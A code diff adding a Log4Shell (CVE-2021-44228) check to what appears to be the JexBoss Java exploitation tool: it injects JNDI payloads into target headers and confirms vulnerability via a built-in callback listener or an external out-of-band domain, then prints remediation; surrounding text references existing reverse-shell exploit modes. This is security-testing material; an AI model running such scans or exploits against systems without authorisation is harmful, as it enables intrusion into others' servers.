@@ -107,6 +107,8 @@ global gl_interrupted
 gl_interrupted = False
 global gl_args
 global gl_http_pool
+global gl_log4shell_detail
+gl_log4shell_detail = None
 
 
 def get_random_user_agent():
@@ -239,7 +241,8 @@ def check_vul(url):
              "Servlet Deserialization" : "",
              "Jenkins": "",
              "Struts2": "",
-             "JMX Tomcat" : ""}
+             "JMX Tomcat" : "",
+             "Log4Shell" : ""}
 
     fatal_error = False
 
@@ -251,6 +254,10 @@ def check_vul(url):
             # check jmx tomcat only if specifically chosen
             if (gl_args.jmxtomcat and vector != 'JMX Tomcat') or\
                     (not gl_args.jmxtomcat and vector == 'JMX Tomcat'): continue
+
+            # check Log4Shell only if specifically chosen (needs a callback/listener)
+            if (gl_args.log4shell and vector != 'Log4Shell') or\
+                    (not gl_args.log4shell and vector == 'Log4Shell'): continue
 
             if gl_args.app_unserialize and vector != 'Application Deserialization': continue
 
@@ -372,6 +379,48 @@ def check_vul(url):
                 else:
                     paths[vector] = 200
 
+            elif vector == 'Log4Shell':
+
+                global gl_log4shell_detail
+                use_builtin = gl_args.log4shell_listen
+                if use_builtin:
+                    callback_host = gl_args.log4shell_listen_ip
+                    callback_port = gl_args.log4shell_listen_port
+                else:
+                    callback_host = gl_args.log4shell_callback
+                    callback_port = None
+
+                sent = _exploits.exploit_log4shell(url, callback_host, callback_port,
+                                                   use_builtin, gl_args.cookies)
+
+                if use_builtin:
+                    # wait for the target to call back to our listener
+                    hit = None
+                    waited = 0.0
+                    while waited < gl_args.log4shell_wait:
+                        if gl_interrupted: break
+                        hit = _exploits.get_log4shell_hit(sent)
+                        if hit is not None: break
+                        sleep(0.5)
+                        waited += 0.5
+                    if hit is not None:
+                        gl_log4shell_detail = hit
+                        paths[vector] = 200
+                    else:
+                        paths[vector] = 505
+                        print_and_flush(GREEN + "  [ NO CALLBACK RECEIVED ]" + ENDC)
+                        continue
+                else:
+                    # external collaborator: we cannot auto-confirm, report what was sent
+                    paths[vector] = 505
+                    print_and_flush(RED + "  [ PAYLOADS SENT - CHECK YOUR COLLABORATOR ]" + ENDC)
+                    print_and_flush(GREEN + "   Injected a unique token per point into \"%s\":" % callback_host + ENDC)
+                    for token in sorted(sent):
+                        print_and_flush(GREEN + "      %s.%s  ->  %s" % (token, callback_host, sent[token]) + ENDC)
+                    print_and_flush(GREEN + "   If any of the tokens above hits your collaborator, that injection "
+                                            "point is vulnerable.\n" + ENDC)
+                    continue
+
             # check jboss vectors
             elif vector == "JMXInvokerServlet":
                 # user privided web-console path and checking JMXInvoker...
@@ -469,6 +518,12 @@ def check_vul(url):
                 elif vector == "JMX Tomcat":
                     print_and_flush(RED + "  [ MAYBE VULNERABLE ]" + ENDC)
                     logging.info("Server %s: RUNNING JENKINS" %url)
+                elif vector == "Log4Shell":
+                    print_and_flush(RED + "  [ VULNERABLE ]" + ENDC)
+                    if gl_log4shell_detail is not None:
+                        print_and_flush(RED + "   -> JNDI callback received via \"%s\" (from %s)" %
+                                        (gl_log4shell_detail[0], gl_log4shell_detail[1]) + ENDC)
+                    logging.info("Server %s: VULNERABLE to Log4Shell (CVE-2021-44228)" % url)
                 else:
                     print_and_flush(RED + "  [ VULNERABLE ]" + ENDC)
                     logging.info("Server %s: VULNERABLE" % url)
@@ -582,6 +637,25 @@ def auto_exploit(url, exploit_type):
     elif exploit_type == "Struts2":
 
         result = 200
+
+    elif exploit_type == "Log4Shell":
+
+        # Detection was already confirmed out-of-band. Full RCE would require serving
+        # a malicious class from a rogue LDAP/RMI server, which is intentionally out of
+        # scope here. Show remediation guidance instead.
+        print_and_flush(RED + BOLD + " * Log4Shell (CVE-2021-44228) confirmed via out-of-band JNDI/LDAP callback." + ENDC)
+        if gl_log4shell_detail is not None:
+            print_and_flush(GREEN + "   Vulnerable injection point: \"%s\" (callback from %s)\n" %
+                            (gl_log4shell_detail[0], gl_log4shell_detail[1]) + ENDC)
+        print_and_flush(GREEN +
+              "   Remediation:\n"
+              "    - Upgrade log4j-core to 2.17.1+ (2.12.4 for Java 7, 2.3.2 for Java 6).\n"
+              "    - If you cannot upgrade, remove the JndiLookup class from the classpath:\n"
+              "        zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class\n"
+              "    - Also review CVE-2021-45046 / CVE-2021-45105 / CVE-2021-44832.\n"
+              "   Type [ENTER] to continue...\n" + ENDC)
+        input().lower() if version_info[0] >= 3 else raw_input().lower()
+        return True
 
     # if it seems to be exploited (201 is for jboss exploited with gadget)
     if result == 200 or result == 500 or result == 201:
@@ -847,6 +921,16 @@ def help_usage():
      BLUE + "\n\n For Apache Struts2 Vulnerabilities (CVE-2017-5638):\n" +
      GREEN + "\n  $ python jexboss.py -u http://vulnerable_java_app/path.action --struts2\n" +
 
+     BLUE + "\n\n For Log4Shell / JNDI injection (CVE-2021-44228) with the built-in listener\n"
+            " (auto-confirms the callback and shows which header is vulnerable):\n" +
+     GREEN + "\n  $ python jexboss.py -u http://vulnerable_java_app/ --log4shell \\\n"
+             "    --log4shell-listen --log4shell-listen-ip YOUR_REACHABLE_IP" +
+
+     BLUE + "\n\n For Log4Shell using an external out-of-band service (Burp Collaborator, \n"
+            " interactsh, canarytokens or your own DNS):\n" +
+     GREEN + "\n  $ python jexboss.py -u http://vulnerable_java_app/ --log4shell \\\n"
+             "    --log4shell-callback YOUR_OOB_DOMAIN\n" +
+
      BLUE + "\n\n For auto scan mode, you must provide the network in CIDR format, "
    "\n list of ports and filename for store results:\n" +
     GREEN + "\n  $ python jexboss.py -mode auto-scan -network 192.168.0.0/24 -ports 8080,80 \n"
@@ -914,6 +998,9 @@ def main():
                     if vector == "Application Deserialization":
                         msg_confirm = "   If successful, this operation will provide a reverse shell. You must enter the\n" \
                                       "   IP address and Port of your listening server.\n"
+                    elif vector == "Log4Shell":
+                        msg_confirm = "   Log4Shell was confirmed out-of-band. This will only show remediation\n" \
+                                      "   guidance (no exploitation/RCE is performed).\n"
                     else:
                         msg_confirm = "   If successful, this operation will provide a simple command shell to execute \n" \
                                       "   commands on the server..\n"
@@ -1079,6 +1166,24 @@ if __name__ == "__main__":
     parser.add_argument("--struts2", help="Check only for Struts2 Jakarta Multipart parser (CVE-2017-5638).", action='store_true')
     parser.add_argument("--jmxtomcat", help="Check JMX JmxRemoteLifecycleListener in Tomcat (CVE-2016-8735 and "
                                             "CVE-2016-3427). OBS: Will not be checked by default.", action='store_true')
+    parser.add_argument("--log4shell", help="Check for Log4Shell / JNDI injection (CVE-2021-44228, CVE-2021-45046) by "
+                                            "injecting JNDI payloads into commonly logged headers and the query string. "
+                                            "Requires --log4shell-listen or --log4shell-callback. "
+                                            "OBS: Will not be checked by default.", action='store_true')
+    parser.add_argument("--log4shell-listen", help="Start a built-in TCP listener to AUTOMATICALLY confirm Log4Shell "
+                                            "callbacks and identify the vulnerable injection point (no external service "
+                                            "needed). Use together with --log4shell-listen-ip.", action='store_true')
+    parser.add_argument("--log4shell-listen-ip", help="IP address embedded in the JNDI payload that the target will call "
+                                            "back to (must be reachable from the target). Used with --log4shell-listen.",
+                                            type=str, metavar='IP')
+    parser.add_argument("--log4shell-listen-port", help="TCP port for the built-in Log4Shell listener (default 1389).",
+                                            type=int, default=1389)
+    parser.add_argument("--log4shell-callback", help="External out-of-band domain (Burp Collaborator, interactsh, "
+                                            "canarytokens or your own authoritative DNS) used to detect JNDI callbacks. "
+                                            "A unique token is injected per point so you can tell which one fired.",
+                                            type=str, metavar='DOMAIN')
+    parser.add_argument("--log4shell-wait", help="Seconds to wait for a Log4Shell callback on the built-in listener "
+                                            "before deciding (default 8).", type=int, default=8)
 
     parser.add_argument('--proxy', "-P", help="Use a http proxy to connect to the target URL (eg. -P http://192.168.0.1:3128)", )
     parser.add_argument('--proxy-cred', "-L", help="Proxy authentication credentials (eg -L name:password)", metavar='LOGIN:PASS')
@@ -1144,6 +1249,18 @@ if __name__ == "__main__":
         banner()
         print (help_usage())
         exit(0)
+    elif gl_args.log4shell and not gl_args.log4shell_listen and gl_args.log4shell_callback is None:
+        banner()
+        print_and_flush(RED + " * The --log4shell check requires an out-of-band channel.\n"
+                              "   Use one of:\n"
+                              "     --log4shell-listen --log4shell-listen-ip <YOUR_REACHABLE_IP>   (built-in, auto-confirm)\n"
+                              "     --log4shell-callback <YOUR_OOB_DOMAIN>                          (Burp Collaborator / interactsh / etc.)\n" + ENDC)
+        exit(0)
+    elif gl_args.log4shell and gl_args.log4shell_listen and gl_args.log4shell_listen_ip is None:
+        banner()
+        print_and_flush(RED + " * --log4shell-listen requires --log4shell-listen-ip <YOUR_REACHABLE_IP>\n"
+                              "   (the address the target JVM will connect back to).\n" + ENDC)
+        exit(0)
     else:
         configure_http_pool()
         _updates.set_http_pool(gl_http_pool)
@@ -1152,6 +1269,15 @@ if __name__ == "__main__":
         if gl_args.proxy and not is_proxy_ok():
             exit(1)
         if gl_args.gadget == 'dns': gl_args.cmd = gl_args.dns
+        if gl_args.log4shell and gl_args.log4shell_listen:
+            listener = _exploits.start_log4shell_listener('0.0.0.0', gl_args.log4shell_listen_port)
+            if listener is not True:
+                print_and_flush(RED + " * Could not start the Log4Shell listener on port %s: %s\n"
+                                      "   (ports below 1024 usually require root; try --log4shell-listen-port 1389)\n"
+                                      % (gl_args.log4shell_listen_port, listener) + ENDC)
+                exit(1)
+            print_and_flush(GREEN + " * Log4Shell listener started on 0.0.0.0:%s (callback IP in payloads: %s)\n"
+                            % (gl_args.log4shell_listen_port, gl_args.log4shell_listen_ip) + ENDC)
         main()
 
 if __name__ == '__testing__':
